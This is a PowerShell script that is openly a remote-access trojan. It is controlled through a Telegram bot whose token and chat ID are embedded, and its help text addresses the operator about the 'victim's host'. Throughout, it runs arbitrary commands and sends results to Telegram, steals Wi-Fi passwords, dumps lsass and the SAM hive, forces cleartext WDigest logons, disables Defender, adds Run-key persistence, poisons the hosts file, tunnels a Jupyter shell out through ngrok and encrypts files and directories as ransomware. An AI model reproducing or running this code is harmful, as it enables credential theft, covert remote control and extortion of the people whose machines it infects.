class CryptoAc
{
    [void]temp($path)
    {
        if(([System.IO.File]::Exists($path)) -eq $false)
        {
            mkdir $path
        }
    }

    [void]writeXorBytes($a,$b,$sw)
    {
        for ($i=0; $i-lt $a.Length; $i++)
        {
            $xored = ($a[$i] -bxor $b[$i])
            $sw.WriteLine($xored)
        }  
    }

    [array]randKey($key)
    {
        $sha512 = [System.Security.Cryptography.SHA512]::Create()
        return $sha512.ComputeHash($key)
    }

     hidden [array]spliter($data,$pointer)
    {
        # $block = @()
        # for ($i=$pointer;$i-lt $pointer+64;$i++)
        # {   
        #     $block += $data[$i]
        # }
        return $data[$pointer..($pointer+63)]
        return $block
    }

    [array]xorBytes($a,$b)
    {
        [array]$xored = @()
        for ($i=0; $i-lt $a.Length; $i++)
        {
            $xored += ($a[$i] -bxor $b[$i])
        }
        return $xored
    }

    [array]randFirstKey($data,$key)
    {
        $h = ([CryptoAc]::new()).randKey($data)
        $nkey = ([CryptoAc]::new()).xorBytes($h,$key)
        return $nkey
    }

    [array] genKey($password)
    {
        return ([CryptoAc]::new()).randKey([byte[]][char[]]$password)
    }

    [array] fKeyDecrypt($data,$key)
    {
        $hdata = @()
        for ($i=0; $i-lt 64; $i++)
        {
            $hdata += $data[$i]
        }
        $nkey = ([CryptoAc]::new()).xorBytes($hdata,$key)
        return $nkey
    }

    hidden [array]pad($data)
    {
        $p = ($data.Length)
        if ($p -lt 64)
        {
            $p = 63 - $p
            $data += @(124)
            while ($p -lt 64)
            {
                $data += 0
                $p+=1
            }
        }
        Elseif(($p%64)-ne 0)
        {
            $data += @(124)
            $p = 64 - (($p % 64) + 1)
            while($p -ne 0)
            {
                $data += 0
                $p-=1
            }
        }
        else{
            for ($i=0; $i-lt 63; $i++)
            {
                $data += 0
            }
            $data += 110
        }
        return $data
    }

    hidden [array]unpad($data)
    {
        $c = 1
        if(($data[-1]) -eq 110)
        {
            return $data[0..(($data.Length) - 65)]
        }
        while(($data[-$c]) -eq 0)
        {
            $c+=1
        }
        return $data[0..(($data.Length)-($c+1))]
    }

    [array] encrypt($data,$key)
    {
        $data = ([CryptoAc]::new()).pad($data)
        $sw = new-object system.IO.StreamWriter("$env:APPDATA/ENENENACACAC.key")
        foreach($i in (([CryptoAc]::new()).randKey($data)))
        {
            $sw.WriteLine($i)
        }
        $key = ([CryptoAc]::new()).randFirstKey($data,$key)
        $ca = ([CryptoAc]::new())
        for($i=0; $i-lt $data.Length; $i+=64)
        {
            $block = ([CryptoAc]::new()).spliter($data,$i)
            ([CryptoAc]::new()).writexorBytes($block,$key,$sw)
            $key = ([CryptoAc]::new()).randKey($key)
        }
        $sw.close()
        $res = [System.IO.File]::ReadAllLines("$env:APPDATA/ENENENACACAC.key") ; Remove-Item -Path "$env:APPDATA/ENENENACACAC.key"
        return $res
        # return $res
    }

    [array]decrypt($data,$key)
    {
        $key = ([CryptoAc]::new()).fKeyDecrypt($data,$key)
        $sw = new-object system.IO.StreamWriter("$env:APPDATA/DECDECACACAC.key")
        $ca = ([CryptoAc]::new())
        for($i=64; $i-lt $data.Length; $i+=64)
       {
            $block = $ca.spliter($data,$i)
            $ca.writeXorBytes($block,$key,$sw)
            $key = $ca.randKey($key) 
        }
        $sw.close()
        $res = [System.IO.File]::ReadAllLines("$env:APPDATA/DECDECACACAC.key") ; Remove-Item -Path "$env:APPDATA/DECDECACACAC.key"
        return ([CryptoAc]::new()).unpad($res)
    }

    [boolean]encryptFile($path,$key)
    {
        $data = [System.IO.File]::ReadAllBytes($path)
        $enc = ([CryptoAc]::new()).encrypt($data,$key)
        [System.IO.File]::WriteAllBytes($path,$enc)
        return $true
    }

    [boolean]decryptFile($path,$key)
    {
        $data = [System.IO.File]::ReadAllBytes($path)
        $dec = ([CryptoAc]::new()).decrypt($data,$key)
        [System.IO.File]::WriteAllBytes($path,$dec)
        return $true
    }
}


class AEScrypto
{
    [array]genKey($password)
    {
        $sha = [System.Security.Cryptography.SHA256]::Create() ; $sha = $sha.ComputeHash([byte[]][char[]]$password)
        return $sha
    }

    [array]genIV($key)
    {
        $sha = [System.Security.Cryptography.MD5]::Create()
        return ($sha.ComputeHash($key))[0..15]
    }

    [array]encrypt($data,$key,$IV)
    {
        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aesManaged.Key = $key
        $aesManaged.IV = $IV
        $encryptor = $aesManaged.CreateEncryptor()
        return $encryptor.TransformFinalBlock($data, 0, $data.Length)
    }

    [array]decrypt($data,$key,$IV)
    {
        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aesManaged.Key = $key
        $aesManaged.IV = $IV
        $decryptor = $aesManaged.CreateDecryptor()
        return $decryptor.TransformFinalBlock($data,0, $data.Length)
    }

    [boolean]encryptFile($path,$key,$IV)
    {
        # $data = [System.IO.File]::ReadAllBytes($path)
        $enc = ([AEScrypto]::new()).encrypt([System.IO.File]::ReadAllBytes($path),$key,$IV)
        [System.IO.File]::WriteAllBytes($path,$enc)
        return $true
    }

    [boolean]decryptFile($path,$key,$IV)
    {
        # $data = [System.IO.File]::ReadAllBytes($path)
        $dec = ([AEScrypto]::new()).decrypt([System.IO.File]::ReadAllBytes($path),$key,$IV)
        [System.IO.File]::WriteAllBytes($path,$dec)
        return $true
    }

    [array]GetFiles($path) 
    { 
        return (Get-ChildItem -Path $path -Recurse -Force | where name -ne $null | Select FullName).FullName
    }

    [array]EncyptDirectory($path,$key,$iv)
    {
        $sec=@()
        $fal=@()
        foreach ($i in (([AEScrypto]::new()).GetFiles($path))){
            try{
                if(([System.IO.File]::Exists($i))-eq $true)
                {
                    ([AEScrypto]::new()).encryptFile($i,$key,$iv)
                    $sec+="$i : sec"
                }
           }catch{
               $fal+="$i : fai"
            }
        }
        return $sec + $fal
    }

    [array]DecryptDirectory($path,$key,$iv)
    {
        $sec=@()
        $fal=@()
        foreach ($i in (([AEScrypto]::new()).GetFiles($path))){
            try{
                if(([System.IO.File]::Exists($i))-eq $true)
                {
                    ([AEScrypto]::new()).decryptFile($i,$key,$iv)
                    $sec+="$i : sec"
                }   
            }catch{
               $fal+="$i : fai"
           }
        }
        return $sec + $fal
    }
}


function run-asAdmin($path,$password)
{
    if (is-administartor)
    {
        return "alredy ru as admin."
    }
    $vbscript = @('set WshShell = WScript.CreateObject("WScript.Shell")'
    'WshShell.Run "cmd"'
    'WScript.Sleep 100 '
    'WshShell.AppActivate'+ "C:\Windows\system32\cmd.exe"
    'WScript.Sleep 100'
    'WshShell.SendKeys'+ "runas /user:administrator $path"
    'WshShell.SendKeys'+ "{ENTER}"
    'WshShell.SendKeys'+ "$password"
    'WshShell.SendKeys'+ "{ENTER}")
    echo '' > vbscript.vbs
    foreach($i in $vbscript)
    {
        echo "$i`n" >> vbscript.vbs
    }
    start-process vbscript.vbs
}

function read-comm()
{
    Param
    (
       [Parameter(Mandatory=$true, Position=0)]
        $apiToken,
        [Parameter(Mandatory=$true, Position=1)]
        [string] $offset
   )
    $url="https://api.telegram.org/bot$apiToken/getUpdates?offset=$offset"
    $ProgressPreference = 'SilentlyContinue' 
    $r=Invoke-WebRequest -Uri $url -UseBasicParsing
    $ProgressPreference = 'Continue'
    $test = $r | ConvertFrom-Json
    $message = $test.result.message[-1]
    $message = $message.text
    $offset = $test.result.update_id[-1]
    return $message, $offset
}



function Excmd
{

   param
   (
        [Parameter(Mandatory)]
        [string] $command
    )
    try{
        $out = Invoke-Expression -Command $command | Out-String
        return $out
    }
    catch{
        return "Failed to run command"
    }
   
}


function Send-data ($data,$apiToken,$chat_id)
{
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$data"
    $ProgressPreference = 'SilentlyContinue' 
    $r=Invoke-WebRequest -Uri $url
    $ProgressPreference = 'Continue'
    
}


function First-offset
{
    Param
    (
         [Parameter(Mandatory=$true, Position=0)]
         [string] $apiToken
    )

    $url = "https://api.telegram.org/bot$apiToken/getUpdates?offset="
    $ProgressPreference = 'SilentlyContinue' 
    $r=Invoke-WebRequest -Uri $url -UseBasicParsing | ConvertFrom-Json
    $ProgressPreference = 'Continue'
    $Foffset = $r.result.update_id
    $foo = $Foffset[-1]
    if ($foo.ToString().Length -gt 1)
    {
        return $foo
    }
    else
    {
        return $Foffset
    }

}

function get-wifiPasswords
{   
    $test = netsh wlan show profiles
    $profiles = @()
    foreach($i in $test)
    {
        if($i.contains("All User Profile"))
        {
            $profiles+=$i.Split(':')[-1].Trim()
        }
    }
    $passwords = ""
    foreach($i in $profiles)
    {
        $password = netsh wlan show profile $i key = clear
        if (([string]$password).Contains("Key Content"))
        {
            foreach($n in $password)
            {
                if ($n.contains("Key Content"))
                {
                    $keyCon = $n.split(' : ')[-1].Trim()
                    $passwords+="$i     :    $keyCon`n"
                }
            }
        }
    }
    return $passwords
}



function start-myshell($apiToken,$chat_id,$urlToNG)
{
    # Param
    # (
    #     [Parameter(Mandatory=$true, Position=0)]
    #     [string] $apiToken,
    #     [Parameter(Mandatory=$true, Position=1)]
    #     [string] $chat_id
    #     [Parameter(Mandatory=$true, Position=2)]
    #     [string] $urlToNG
    # )

    $currentuser = [System.Environment]::UserName
    $currentip = (Test-Connection -ComputerName $env:computername -count 1).IPv4Address.IPAddressToString
    Send-data -data "User $currentuser is Connected!" -chat_id $chat_id -apiToken $apiToken
    if (-not($urlToNG -eq $null))
    {
        Send-data -apiToken $apiToken -chat_id $chat_id -data "Ngrok url of $currentip is : $urlToNG"
    }
    $addpers = Add-Run
    if ($addpers -like "Added")
    {
        Send-data -apiToken $apiToken -chat_id $chat_id -data "successfully added program to the registry!"
    }
    else{
        if($addpers -eq $false)
        {
           Send-data -apiToken $apiToken -chat_id $chat_id -data "failed to add item to the registry!" 
        }
    }

    run-once    
    $offset = First-offset $apiToken
    $foo = $offset
    $specid = [string](Get-Random -Maximum 4000000000)
    while ($true)
    {
        try
        {   
            
            $message = read-comm -apiToken $apiToken -offset $offset
            $offset = $message[1]
            if ($offset.contains(" "))
            {
                $offset = -split $offset
                $offset = $offset[-1]
            }

            
            if (-not($offset -eq $foo))
            {
                $foo=$offset
                $command = $message[0]

                if ($command.contains('get wifi passwords'))
                {
                    $output = get-wifiPasswords
                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken
                }

                ElseIf($command.contains('save password as clear text'))
                {
                    $output = savePassword-clearText
                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken   
                }

                ElseIf($command.contains('get dump lsass file'))
                {
                    if((is-administartor) -eq $false)
                    {
                        Send-data -data "Command must be exicuted as admin" -chat_id $chat_id -apiToken $apiToken 
                    }
                    else{
                        $output = get-lssasDump
                        Send-data -data $output -chat_id $chat_id -apiToken $apiToken 
                    }  
                }

                ElseIf($command.contains('force run as admin -p'))
                {
                    $password = ($command.split('-p')[0]).Trim()
                    $path = [Environment]::GetCommandLineArgs()[0]
                    $path = [string]$path
                    run-asAdmin -path $path -password $password
                    # $output run-asAdmin -password $pass -path $path 
                }
                ElseIf($command.contains('get dump sam file'))
                {
                    if((is-administartor) -eq $false)
                    {
                        Send-data -data "Command must be exicuted as admin" -chat_id $chat_id -apiToken $apiToken 
                    }
                    else{
                        $output = dump-sam
                        foreach($i in $output)
                        {
                            Send-data -data $i -chat_id $chat_id -apiToken $apiToken  
                        }
                    }
                }
                ElseIf($command.contains('disable real time protecion'))
                {
                    $output = disable-protection
                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken 
                }
                ElseIf($command.contains('route dns host -h'))
                    {
                        $hostd = ($command.Replace("route dns host -h",'')).split('-d')[0].Trim()
                        $domain = ($command.Replace("route dns host -h",'')).split('-d')[-1].Trim()
                        $output = mod-host -hostd $hostd -domain $domain
                        echo $output
                        Send-data -data $output -chat_id $chat_id -apiToken $apiToken
                    }
                ElseIf($command.contains('get file -p'))
                {
                    $path = ($command.Replace("get file -p",'')).Trim()
                    $urlToNG = Get-ngrokToken
                    if ($urlToNG -eq $false)
                    {
                        Send-data -data "failed to extract ngrok url try again later" -chat_id $chat_id -apiToken $apiToken 
                    }
                    else{
                        $output = get-file -path $path -urlToNG $urlToNG
                        Send-data -data $output -chat_id $chat_id -apiToken $apiToken
                    }
                }
                ElseIf($command.contains('get real time protection status'))
                {
                    if (IsMonitoring-Disable){
                        Send-data -data "Real time protection is disable!" -chat_id $chat_id -apiToken $apiToken
                    }
                    else{
                        Send-data -data "Real-time protection is enabled -_-" -chat_id $chat_id -apiToken $apiToken
                    }
                }
                ElseIf(([string]$command.Trim()) -like "-help")
                {
                    $output = get-MyHelp
                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken
                }
                ElseIf(([string]$command.Trim()) -like "display spec id"){
                    $imhim
                    Send-data -data "$specid : $imhim" -chat_id $chat_id -apiToken $apiToken
                }
                ElseIf(([string]$command.Trim()) -like "kill -id $specid"){
                    exit
                }
                ElseIf(([string]$command.Trim()) -like "Disconnect"){
                    handle-client -apiToken $apiToken -chat_id $chat_id -update $null
                    Send-data -data "session closed." -chat_id $chat_id -apiToken $apiToken
                }
                ElseIf($command.contains('ransomware -AC ')){
                    $key = (($command -split '-k ')[-1]).Trim()
                    $path = (((($command -split '-k')[0]) -split "-p")[-1]).Trim()
                    if([System.IO.File]::Exists($path)){
                        Send-data -data "Trying to encrypt file..." -chat_id $chat_id -apiToken $apiToken
                        try{
                            $key = ([CryptoAc]::new()).genKey($key)
                            ([CryptoAc]::new()).encryptFile($path,$key)
                            Send-data -data "Successfuly completed!" -chat_id $chat_id -apiToken $apiToken
                        }catch{
                            Send-data -data "Failed to encrypt file -_-" -chat_id $chat_id -apiToken $apiToken
                        }
                    }else{
                        Send-data -data "The file does not exist." -chat_id $chat_id -apiToken $apiToken
                    }
                }
                ElseIf($command.contains('ransomfile -e -AES ')){
                    $key = (($command -split '-k ')[-1]).Trim()
                    $path = (((($command -split '-k')[0]) -split "-p")[-1]).Trim()
                    if([System.IO.File]::Exists($path)){
                        Send-data -data "Trying to encrypt file..." -chat_id $chat_id -apiToken $apiToken
                        try{
                            $key = ([AEScrypto]::new()).genKey($key)
                            $iv = ([AEScrypto]::new()).genIV($key)
                            if (([AEScrypto]::new()).encryptFile($path,$key,$iv)-eq $true){
                                Send-data -data "Successfuly completed!" -chat_id $chat_id -apiToken $apiToken
                            }else{
                                Send-data -data "The file does not exist." -chat_id $chat_id -apiToken $apiToken
                            }
                        }catch{
                            Send-data -data "Failed to encrypt file -_-" -chat_id $chat_id -apiToken $apiToken
                        }
                    }
                }
                ElseIf($command.contains('ransomfile -d -AES '))
                {
                    $key = (($command -split '-k ')[-1]).Trim()
                    $path = (((($command -split '-k')[0]) -split "-p")[-1]).Trim()
                    if([System.IO.File]::Exists($path)){
                        try{
                            $key = ([AEScrypto]::new()).genKey($key)
                            $iv = ([AEScrypto]::new()).genIV($key)
                            if (([AEScrypto]::new()).decryptFile($path,$key,$iv)-eq $true){
                                Send-data -data "Successfuly completed!" -chat_id $chat_id -apiToken $apiToken
                            }else{
                                Send-data -data "Decryption failed." -chat_id $chat_id -apiToken $apiToken
                            }
                        }catch{
                            Send-data -data "You cannot access this file -_-" -chat_id $chat_id -apiToken $apiToken
                        }
                    }else{
                        Send-data -data "File does not exist -_-" -chat_id $chat_id -apiToken $apiToken
                    }
                }
                ElseIf($command.contains('ransomdir -e -AES '))
                {
                    $key = (($command -split '-k ')[-1]).Trim()
                    $path = (((($command -split '-k')[0]) -split "-p")[-1]).Trim()
                    if(Test-Path $path){
                        $key = ([AEScrypto]::new()).genKey($key)
                        $iv = ([AEScrypto]::new()).genIV($key)
                        $res = "" 
                        foreach($i in (([AEScrypto]::new()).EncyptDirectory($path,$key,$iv))){
                            $res+= "$i`n"
                        }
                        if($res.Length -eq 0)
                        {
                            Send-data -data "Operation was succesful" -chat_id $chat_id -apiToken $apiToken 
                        }
                        Send-data -data $res -chat_id $chat_id -apiToken $apiToken 
                    }else{
                        Send-data -data "No such a folder" -chat_id $chat_id -apiToken $apiToken
                    }
                }
                ElseIf($command.contains('ransomdir -d -AES '))
                {
                    $key = (($command -split '-k ')[-1]).Trim()
                    $path = (((($command -split '-k')[0]) -split "-p")[-1]).Trim()
                    if(Test-Path $path){
                        $key = ([AEScrypto]::new()).genKey($key)
                        $iv = ([AEScrypto]::new()).genIV($key)
                        $res = "" 
                        foreach($i in (([AEScrypto]::new()).DecryptDirectory($path,$key,$iv))){
                            $res+= "$i`n"
                        }
                        if($res.Length -eq 0)
                        {
                            Send-data -data "Operation was succesful" -chat_id $chat_id -apiToken $apiToken 
                        }
                        Send-data -data $res -chat_id $chat_id -apiToken $apiToken 
                    }else{
                        Send-data -data "No such a folder" -chat_id $chat_id -apiToken $apiToken
                    }
                }
                else{
                    $output = Excmd $command
                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken
                }
            }
        }    
        catch 
        {
            $errors = 1
        }
        Start-Sleep -Seconds 1  
    } 

}


function start-ngrok($port,$path)
{
    "taskkill /IM ngrok.exe /F >nul: 2>nul:" | cmd -ErrorAction SilentlyContinue | Out-Null
    $path = "$path\ngrok.exe"
    $arrgs = "http $port"
    start-process $path -ArgumentList $arrgs -WindowStyle hidden | Out-Null
}

function Start-Jupyter($token,$port)
{
    $arrgs = "--ip 0.0.0.0 --no-browser --port=$port --allow-root --NotebookApp.token='$token'" 
    start-process "jupyter-notebook.EXE" -ArgumentList "$arrgs" -WindowStyle hidden
}

function Get-ngrokToken()
{
    try
    {
        $res = Invoke-WebRequest http://localhost:4040/api/tunnels
        $res = $res | ConvertFrom-Json
        $res = $res.tunnels ; $res = $res.public_url
        return $res
    }
    catch
    {
        try
        {
            $res = curl  http://localhost:4040/api/tunnels
            $res = $res | ConvertFrom-Json
            $res = $res.tunnels ; $res = $res.public_url
            return $res
        }
        catch{
            return $false
        }
    }
   
}

function Start-JupShell($port,$pathToNg,$token)
{
    $pro = Get-Process | where ProcessName -like *jupyter-notebook*
    $pro = $pro.Id

    foreach($i in $pro)
    {
        Stop-Process -Id $i -ErrorAction SilentlyContinue | Out-Null
    }

    try
    {
        start-jupyter -token $token -port $port
        start-ngrok -path $pathToNg -port $port
        return get-ngrokToken
    }
    catch
    {
        return "Error was occurred while processing" 
    }
}




function mod-host($hostd,$domain)
{
    $cont = Get-Content "C:\Windows\System32\drivers\etc\hosts"
    if (-not("$hostd $domain" -in $cont))
    {
        try
        {
            echo "`n$hostd $domain" >> "C:\Windows\System32\drivers\etc\hosts"
            return 'Successfully completed'
        }
        catch{
            if (is-administartor)
            {
                return "Failed to execute the command -_-"
            }
        }   return 'The command must be executed with admin permission.'
    }
    return "already exist in hosts file"
    return "$hostd $domain already exist in hosts file"
}

function Add-Run
{
    $name = "testRun"
    $value = [Environment]::GetCommandLineArgs()[0]
    $regloc = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
    $key = Get-Item -LiteralPath $regloc
    
    if ($key.GetValue($name, $null) -eq $null)
    {
        try
        {
            New-ItemProperty -Path $regloc -Name $name -Value $value -ErrorAction SilentlyContinue | Out-Null
        }
        catch
        {
            $err = 1
        }
        if (-not($key.GetValue($name, $null) -eq $null))
        {
            return "Added"
        }
        else
        {
            return $false
        }
    }
    return $true
}


function is-administartor
{
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function get-file($path,$urlToNG)
{
    if(([System.IO.File]::Exists($path)) -eq $false)
    {
        return "File doesn't exist"
    }
    $file = Get-Item $path
    $basename = $file.basename + $file.Extension
    $path = $file.DirectoryName
    $path = ($path.replace(($PWD | select -Expand Path),"")).split('\')
    $baseUrl = ""
    foreach($i in $path)
    {
        $baseUrl+="$i/"
    }
    return "$urlToNG/edit/$baseUrl$basename"
}

function get-lssasDump
{
    $res = Invoke-WebRequest http://localhost:4040/api/tunnels
    $res = $res | ConvertFrom-Json
    $res = $res.tunnels ; $urll = $res.public_url
    try
    {
        $Base64String = 'cHJvY2R1bXAgLW1hIGxzYXNzLmV4ZSBDOgpncm9rXGxzc2Fzcy5kbXAgfCBvdXQtc3RyaW5n'
        $commt = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Base64String))
        $test = Invoke-Expression -Command $commt
       if($test.contains('Access is denied'))
       {
           return 'Error while trying to creat dump file. "access denied"'
       }
    }
    catch{
        return 'Error while trying to creat dump file. "access denied"'
    }
    return get-file -urlToNG $urll -path "C:\ngrok\lssass.dmp"
}

function get-base64OfFile($path,$urlToNG)
{
    $file = Get-Item $path
    $basename = $file.basename + $file.Extension
    $path = $file.DirectoryName
    $loc = "$urlToNG/edit$basename"
    Copy-Item -Path path -Destination [System.Environment]::CurrentDirectory
    return ""
}

function dump-sam{
    $ngrokUrl = get-ngrokToken
    $files = @()
    try{
        remove-item C:\ngrok\dumps -Recurse -ErrorAction SilentlyContinue| out-null
        mkdir C:\ngrok\dumps | out-null
    }
    catch{
        mkdir C:\ngrok\dumps | out-null
    }
    echo y | reg save hklm\sam C:\ngrok\dumps\sam | out-null
    echo y | reg save hklm\system C:\ngrok\dumps\system | out-null
    $files+=get-file -path 'C:\ngrok\dumps\sam' -urlToNG $ngrokUrl
    $files+=get-file -path 'C:\ngrok\dumps\system' -urlToNG $ngrokUrl
    return $files 
}

function IsMonitoring-Disable
{
    return (get-MpPreference | select DisableRealtimeMonitoring).DisableRealtimeMonitoring
}


function disable-protection
{
    if ((is-administartor) -eq $false)
    {
        return "Program must run as admin."
    }
    if (IsMonitoring-Disable)
    {
        return "Real time protection is alredy Disable."
    }
    try{
        
        $testDisable = Set-MpPreference -DisableRealtimeMonitoring $true
        if ($testDisable -eq $null)
        {
            return "Successfully completed"
        } 
    }catch{
        return "Error has occurred"
    }
}

function get-MyHelp
{
    $help = @(
    "You are able to run normal commands on the victim's host, however there are several built-in commands to gain additional insights."
    "---------------------------------------------------------------"
    "[+] get wifi passwords" 
    "Description: Steal Wifi passwords" 
    "`n"
    "[+] save password as clear text"  
    "Description: Save all new logon lsass passwords as in clear text (Used to help dump lsass)"
    "`n"
    "[+] get dump lsass file  Description:" 
    "Gather lsass passwords for all users" 
    "`n"
    "[+] force run as admin -p <password>"
    "Description: Run VBS script to forcelly run as admin with password (Ex. 'force run as admin -p 1234')"
    "`n"
    "[+] get dump lsass file " 
    "Description: Gather all lsass passwords and credentials for all users including Kerberos tickes"
    "`n"
    "[+] get dump sam file"  
    "Description: Gather all logon passwords hashes for all users "
    "`n"
    "[+] disable real time protecion"  
    "Description: Might require external premissions"
    "`n"
    "[+] route dns host -h <host> -d <domain> " 
    "Description: Modify the hosts file to overwright IP to a selected domain (DNS poisining)"
    "`n"
    "[+] get file -p <path> " 
    "Description: Generate Ngrok URL for a file in the host (Requires full file path)"
    "`n"
    "[+] get real time protection status"  
    "Description: Check if Real time Protection is Enable/Disable"
    )
    $helhelp
    foreach($i in $help)
    {
        $helhelp+="$i`n"
    }
    return $helhelp
}

function run-once
{
    try
    {
        $procid = Get-Content "$env:APPDATA\ProcessId.pid"
        $testid = (Get-Process | Select-Object path | where Id -like $procid).Id
        if ($testid -eq $null)
        {
            $currId = [System.Diagnostics.Process]::GetCurrentProcess().Id
            echo $currId > "$env:APPDATA\ProcessId.pid"
            return $null
        }
        else{
            exit
        }
    }
    catch
    {
        $currId = [System.Diagnostics.Process]::GetCurrentProcess().Id
        echo $currId > "$env:APPDATA\ProcessId.pid"
    }
}


function handle-client($apiToken,$chat_id,$update)
{
    if ($update -ne $null)
    {
        $curip = (Test-Connection -ComputerName $env:computername -count 1).IPv4Address.IPAddressToString
        Send-data -data "New connection`n$curip, $env:username" -chat_id $chat_id -apiToken $apiToken
    }
    $offset = First-offset $apiToken
    $foo = $offset
    while($true)
    {
        try
        {   
            $message = read-comm -apiToken $apiToken -offset $offset
            $offset = $message[1]
            if ($offset.contains(" "))
            {
                $offset = -split $offset
                $offset = $offset[-1]
            }

            
            if (-not($offset -eq $foo))
            {
                $foo=$offset
                $command = $message[0]
                if($message.contains("connected"))
                {
                    Send-data -data "$curip, $env:username" -chat_id $chat_id -apiToken $apiToken
                }
                ElseIf($message.contains("connect $curip, $env:username")){
                    Set-Location C:\
                    try
                    {
                        $path_to_ngrok = "C:\ngrok\ngrok.exe"
                        if(([System.IO.File]::Exists($path_to_ngrok)) -eq $false)
                        {
                            mkdir C:\ngrok
                            Invoke-WebRequest "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile C:\ngrok\ngrok.zip
                            Expand-Archive C:\ngrok\ngrok.zip -Destination C:\ngrok
                            ngrok config add-authtoken "29vkNHzdWuNEUj0ThSaFJEpxdvT_3MLz6UiVLrJriFtCvT7XR"
                        }
                        $urlToNG = Start-JupShell -port "9090" -pathToNg C:\ngrok -token 'yourComputerHasBeenHacked'
                    }
                    catch{
                        $err = 1
                    }
                    start-myshell -apiToken $apiToken -chat_id $chat_id -urlToNG $urlToNG
                }
            }
        }catch{
            $errr = 1
        }
        Start-Sleep -Seconds 3
    }
}


function savePassword-clearText
{
    if ((is-administartor)-eq $false)
    {
        return "Must run as admin"
    }
    try{
        echo y | reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
        return "Successfully completed!"
    }
    catch 
    {
        return "Failed!"
    }
}



$apiToken = '5603815915:AAGbkRsoHpMmncrkM7GZPHImydZDSclfysA'
$chat_id = '-1001830797904'

handle-client -apiToken  $apiToken -chat_id $chat_id -update "NotNull"

# $command = 'ransomware -AC -p C:\Users\aronc\zxc.txt -k asdf'
# $key = (($command -split '-k ')[-1]).Trim()
# $path = (((($command -split '-k')[0]) -split "-p")[-1]).Trim()


